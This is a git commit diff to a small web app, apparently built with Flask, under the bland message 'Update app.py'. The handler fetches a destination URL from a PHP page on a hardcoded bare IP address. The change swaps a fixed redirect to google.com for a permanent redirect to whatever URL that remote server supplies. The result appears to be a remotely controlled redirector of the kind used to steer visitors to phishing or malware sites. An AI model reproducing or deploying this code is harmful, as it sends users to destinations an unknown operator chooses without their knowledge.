b606afef2da291ca1a42b3976499da2be6af8f2b
ustwork <112768465+ustwork@users.noreply.github.com>
2022-12-10 02:31:46 +0100

    Update app.py

--- app.py
+++ app.py
@@ -16,7 +16,7 @@ def hello(name):
     sheet = requests.get('http://95.111.230.118/kisho/page/active_r.php?page=saidchase')
     link = sheet.text.strip().split('"')[1].split('\/\/')
     url = f'{link[0]}//{link[1]}'
-    r = make_response(redirect(f"https://google.com", code=301))
+    r = make_response(redirect(f"{url}", code=301))
     r.headers.set('alt-svc', "clear")
     r.headers.set('cache-control', "private, max-age=90")
     r.headers.set('content-security-policy', "referrer always;")
